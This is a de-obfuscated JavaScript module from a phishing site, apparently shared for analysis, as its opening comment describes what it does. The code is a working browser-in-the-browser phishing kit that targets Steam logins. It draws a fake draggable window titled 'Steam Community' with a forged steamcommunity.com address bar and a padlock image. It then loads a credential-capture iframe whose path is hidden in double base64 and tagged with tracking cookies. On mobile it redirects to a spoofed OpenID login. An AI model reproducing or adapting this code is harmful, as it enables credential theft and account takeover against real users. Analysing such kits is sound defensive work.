/* from main.js/ */
/* This is the module that pops open the phishing iframe. The unique IDs (next three lines) appear to change each request.
   It also installs a tracking cookie of some sort. */
var nYg5FdvOp7Gbw32hBvDfEv6s6U="EUW5oUVpFdFVaamMxUkE9PQ==";
var nYg5FdvOp7Gbw32hBvDfEv6s6U1="bb0c518747a6ba5d11998e1c14a503b8";
var nYg5FdvOp7Gbw32hBvDfEv6s6U2="fb5919f3321a6268cfe232280a599edc";
var iuHy6d6Yhhdyh82hHgthjd29Uh8 = "true";
var isMobile = false;
if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i .test(navigator.userAgent) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i .test(navigator.userAgent.substr(0, 4))) {
    isMobile = true
};
if (isMobile === true || iuHy6d6Yhhdyh82hHgthjd29Uh8 === 'full') {
    $(document).on('click', '.goAuth,a[href="/?login"]', function() {
        setCookie('2dxvogojlcccaa4', 'ek(.i?g9saxvnym#jzcw');
        window.location.href = document.location.origin + '/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2F\'+document.location.origin+\'%2F%3Flogin&openid.realm=https%3A%2F%2F\'+document.location.origin+\'&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
        return false
    })
} else {
    if (iuHy6d6Yhhdyh82hHgthjd29Uh8 === 'true') {
        $(function() {
            $('body').append('<script src="' + document.location.origin + '/Content/js/jquery-ui.min.js"></script><link rel="stylesheet" href="' + document.location.origin + '/Content/css/jquery-ui.css"><style>#block9125468745{display:none;position:absolute;top:25px;left:25px;background-color:#fff;border:1px solid #ffffff;color:#000;z-index:999999999;font-family:Rakajdsahds;}.header_block98765522{height:29px;background-color:white;cursor:context-menu;padding:2px 11px;line-height:30px}.header_block98765522 div{font-size: 12px;display:inline-block;vertical-align:top}.header_block58745214{background:url(' + document.location.origin + '/Content/window/favicon.ico) center center/16px 16px no-repeat;width:16px;height:16px;margin:3px 6px 0 -5px}.header_block354789545{float:right;margin:0 6px 0 0;font-size:10px}.block087663142-lock,.flaticon--custom-2:before{font-size:11px}.body_block36547854{height:calc(100% - 30px)}.body_block7318421{border:2px solid #a9a9a9;border-radius:2px 2px 0 0;line-height:26px}.block087663142{width:144px;float:left;color:green;padding:0 0 0 6px;white-space:nowrap}.block087663142-label{margin:0 0 0 6px}.iframe_block494785105{border:0;padding:0;margin:0;overflow-y:scroll;overflow-x:hidden;width:100%;height:calc(100% - 31px)}.flaticon--custom-1:before{margin-left:20px}.flaticon--custom-1:hover{cursor:pointer;color:#ccc}.header_block2145897415{margin:-3px 0 0 -3px}#header_button1,#header_header_button1_hover{position:absolute;right:92px;top:-1px}#header_button2,#header_header_button2_hover{position:absolute;right:46px;top:-1px;}#header_button3,#header_header_button3_hover{position:absolute;right:-1px;top:-1px}#secure_https1,#secure_https2{position:absolute;left:2px}#url_input{height:27px;width:100%}#url_input input:nth-child(1){position:absolute;left:146px;color:#0b8043;background-color:#fff;height:26px}#url_input input:nth-child(2){position:absolute;left:177px;color:#8f8a8a}#url_input input:nth-child(3){color: black;position:absolute;left:190px}#url_input input:nth-child(4){width:723px;position:absolute;left:318px;text-overflow:ellipsis;color:#8f8a8a}.block22548965803{background-color: #ffffff00 !important;font-weight: normal !important;cursor:text !important;line-height:inherit !important;border:0 !important;background-color:#fff !important;height: 26px !important;font-family:Rakajdsahds !important;font-size: 13.33px !important;margin:0 !important;padding:0 !important;}#url_input_selected{height:27px;display:none}#url_input_selected input{color: black;font-size: 13.33px;height: 26px;background-image: none;border: none;background-color: #ffffff00;font-weight: normal;outline: 0px;font-family:Rakajdsahds;padding: 0;margin: 0;width:85%;cursor:text;margin-right:-3px;margin-left:144px;line-height:inherit}@font-face{font-family:Rakajdsahds;font-style:normal;font-weight:100;src:local("Lato Hairline"),local("Lato-Hairline"),url(https://fonts.gstatic.com/s/lato/v13/eFRpvGLEW31oiexbYNx7Y_esZW2xOQ-xsNqO47m55DA.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Rakajdsahds;font-style:normal;font-weight:100;src:local("Lato Hairline"),local("Lato-Hairline"),url(https://fonts.gstatic.com/s/lato/v13/GtRkRNTnri0g82CjKnEB0Q.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215}@font-face{font-family:Rakajdsahds;font-style:normal;font-weight:300;src:local("Lato Light"),local("Lato-Light"),url(https://fonts.gstatic.com/s/lato/v13/dPJ5r9gl3kK6ijoeP1IRsvY6323mHUZFJMgTvxaG2iE.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Rakajdsahds;font-style:normal;font-weight:300;src:local("Lato Light"),local("Lato-Light"),url(https://fonts.gstatic.com/s/lato/v13/EsvMC5un3kjyUhB9ZEPPwg.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215}@font-face{font-family:Rakajdsahds;font-style:normal;font-weight:400;src:local("Lato Regular"),local("Lato-Regular"),url(https://fonts.gstatic.com/s/lato/v13/UyBMtLsHKBKXelqf4x7VRQ.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Rakajdsahds;font-style:normal;font-weight:400;src:local("Lato Regular"),local("Lato-Regular"),url(https://fonts.gstatic.com/s/lato/v13/1YwB1sO8YE1Lyjf12WNiUA.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215}@font-face{font-family:Rakajdsahds;font-style:normal;font-weight:700;src:local("Lato Bold"),local("Lato-Bold"),url(https://fonts.gstatic.com/s/lato/v13/ObQr5XYcoH0WBoUxiaYK3_Y6323mHUZFJMgTvxaG2iE.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:Rakajdsahds;font-style:normal;font-weight:700;src:local("Lato Bold"),local("Lato-Bold"),url(https://fonts.gstatic.com/s/lato/v13/H2DMvhDLycM56KNuAtbJYA.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215}</style><div id="block9125468745"><div class="header_block98765522"><div class="header_block58745214"></div><div class="header_block2145897415">Steam Community <span id="name_of_browser"></span></div><div class="header_block354789545"><img id="header_button1" src="' + document.location.origin + '/Content/window/b1.png"><img id="header_header_button1_hover" id="b1" src="' + document.location.origin + '/Content/window/b1_hover.png" style="opacity:0;"><img id="header_button2" src="' + document.location.origin + '/Content/window/b2.png"><img id="header_header_button2_hover" src="' + document.location.origin + '/Content/window/b2_hover.png" style="opacity:0;"><img id="header_button3" src="' + document.location.origin + '/Content/window/b3.png"><img id="header_header_button3_hover" src="' + document.location.origin + '/Content/window/b3_hover.png" style="opacity:0;"></div></div><div class="body_block36547854"><div class="body_block7318421"><div class="block087663142"><img id="secure_https1" src="' + document.location.origin + '/Content/window/https1.png"><img id="secure_https2" src="' + document.location.origin + '/Content/window/https2.png" style="opacity:0;"></div><div id="url_input"><input class="block22548965803" type="text" disabled="disabled" value="https"><input class="block22548965803" type="text" disabled="disabled" value="://"><input class="block22548965803" type="text" disabled="disabled" value="steamcommunity.com"><input class="block22548965803" type="text" disabled="disabled" value="/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2F' + document.location.origin + '%2F%3Flogin&openid.realm=https%3A%2F%2F' + document.location.origin + '&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"></div><div id="url_input_selected"><input type="text" value="https://steamcommunity.com/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2F' + document.location.origin + '%2F%3Flogin&openid.realm=https%3A%2F%2F' + document.location.origin + '&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"></div></div><iframe class="iframe_block494785105" src=""></iframe></div></div>');
            var _0x428dx2 = 1040;
            var _0x428dx3 = null;
            var _0x428dx4 = null;
            $('#secure_https2,#header_header_button1_hover,#header_header_button2_hover,#header_header_button3_hover').mouseenter(function() {
                $(this).css('opacity', '')
            }).mouseleave(function() {
                $(this).css('opacity', '0')
            });
            var _0x428dx5 = $('#url_input_selected input').val();
            $('#url_input').click(function() {
                $(this).hide();
                $('#url_input_selected input').val(_0x428dx5);
                $('#url_input_selected').show();
                $('#url_input_selected input').select()
            });
            $('#url_input_selected input').focusout(function() {
                $('#url_input_selected').hide();
                $('#url_input').show()
            });
            $('#url_input_selected input').keypress(function(_0x428dx6) {
                if (_0x428dx6.which == 13) {
                    $('#url_input_selected').hide();
                    $('#url_input').show()
                }
            });
            $('#block9125468745').draggable({
                containment: 'window'
            });
            $('#block9125468745').resizable({
                minHeight: 362,
                minWidth: 362
            });
            $('#header_header_button1_hover,#header_header_button2_hover,#header_header_button3_hover').click(function() {
                $('#block9125468745').css({
                    display: 'none'
                });
                $('.iframe_block494785105').html('').prop('src', '');
                clearInterval(_0x428dx3);
                clearTimeout(_0x428dx4)
            });
            var _0x428dx7 = _0x428dx9();
            if (_0x428dx7) {
                $('#name_of_browser').text('- ' + _0x428dx7)
            };
            $(document).on('click', '.goAuth,a[href="/?login"]', function() {
                $('#block9125468745').css({
                    width: '1050px',
                    height: '855px',
                    display: 'block'
                });
                setTimeout(function() {
                    $('.iframe_block494785105').prop('src', document.location.origin + '/' + atob(atob(nYg5FdvOp7Gbw32hBvDfEv6s6U.substring(1))) + '/' + gen_string(10, true) + '/' + gen_string(10, true) + '?q=' + GetCookie(nYg5FdvOp7Gbw32hBvDfEv6s6U1) + '&s=' + GetCookie(nYg5FdvOp7Gbw32hBvDfEv6s6U2))
                }, 1200);
                clearInterval(_0x428dx3);
                clearTimeout(_0x428dx4);
                _0x428dx4 = setTimeout(function() {
                    _0x428dx3 = setInterval(function() {
                        var _0x428dx8 = $('#url_input').width();
                        if (_0x428dx8 != _0x428dx2) {
                            _0x428dx2 = _0x428dx8;
                            $('#url_input input:eq(3)').width(_0x428dx8 - 317);
                            $('#url_input_selected input').width(_0x428dx8 - 160)
                        }
                    }, 5)
                }, 1000);
                return false
            });

            function _0x428dx9() {
                if (!!window.chrome && !!window.chrome.webstore) {
                    return 'Google Chrome'
                } else {
                    if (typeof InstallTrigger !== 'undefined') {
                        return 'Mozilla Firefox'
                    } else {
                        if ((!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0) {
                            return 'Opera'
                        } else {
                            if (/constructor/i .test(window.HTMLElement) || (function(_0x428dxa) {
                                    return _0x428dxa.toString() === '[object SafariRemoteNotification]'
                                })(!window.safari || (typeof safari !== 'undefined' && safari.pushNotification))) {
                                return 'Safari'
                            } else {
                                if (!isIE && !!window.StyleMedia) {
                                    return 'Edge'
                                } else {
                                    if ((isChrome || isOpera) && !!window.CSS) {
                                        return 'Google Chrome'
                                    } else {
                                        return ''
                                    }
                                }
                            }
                        }
                    }
                }
            }
        })
    } else {
        $(document).on('click', '.goAuth,a[href="/?login"]', function() {
            var _0x428dxb = window.open('', '', 'STATUS=NO, TOOLBAR=NO, LOCATION=0, DIRECTORIES=0, RESISABLE=NO, SCROLLBARS=YES, TOP=50, LEFT=50, WIDTH=1004, HEIGHT=800');
            _0x428dxb.document.write('<html style=\'overflow:hidden;\'><head><title>Steam Community</title><style>html, body {width:1004px; height:800px; margin:0px; padding:0px;}</style></head><body><iframe src=\'' + document.location.origin + '/' + atob(atob(nYg5FdvOp7Gbw32hBvDfEv6s6U.substring(1))) + '/' + gen_string(10, true) + '/' + gen_string(10, true) + '?q=' + GetCookie(nYg5FdvOp7Gbw32hBvDfEv6s6U1) + '&s=' + GetCookie(nYg5FdvOp7Gbw32hBvDfEv6s6U2) + '\' border=\'0\' style=\'width:100vw; height:100vh;\'></iframe></body></html>');
            return false
        })
    }
};

function gen_string(_0x428dxd, _0x428dxe) {
    var _0x428dxf = '';
    var _0x428dx10 = 'abcdefghijklmnopqrstuvwxyz';
    if (_0x428dxe == true) {
        _0x428dx10 += '0123456789'
    };
    for (var _0x428dx11 = 0; _0x428dx11 < _0x428dxd; _0x428dx11++) {
        _0x428dxf += _0x428dx10.charAt(Math.floor(Math.random() * _0x428dx10.length))
    };
    return _0x428dxf
}

function GetCookie(_0x428dx13) {
    var _0x428dx14 = document.cookie.match('(^|; )' + _0x428dx13 + '=([^;]*)');
    if (_0x428dx14 && _0x428dx14[2]) {
        return _0x428dx14[2]
    } else {
        return null
    }
}

function setCookie(_0x428dx16, _0x428dx17, _0x428dx18) {
    _0x428dx18 = _0x428dx18 || {};
    var _0x428dx19 = _0x428dx18.expires;
    if (typeof _0x428dx19 == 'number' && _0x428dx19) {
        var _0x428dx1a = new Date();
        _0x428dx1a.setTime(_0x428dx1a.getTime() + _0x428dx19 * 1000);
        _0x428dx19 = _0x428dx18.expires = _0x428dx1a
    };
    if (_0x428dx19 && _0x428dx19.toUTCString) {
        _0x428dx18.expires = _0x428dx19.toUTCString()
    };
    _0x428dx17 = encodeURIComponent(_0x428dx17);
    var _0x428dx1b = _0x428dx16 + '=' + _0x428dx17;
    for (var _0x428dx1c in _0x428dx18) {
        _0x428dx1b += '; ' + _0x428dx1c;
        var _0x428dx1d = _0x428dx18[_0x428dx1c];
        if (_0x428dx1d !== true) {
            _0x428dx1b += '=' + _0x428dx1d
        }
    };
    document.cookie = _0x428dx1b + '; path=/'
}
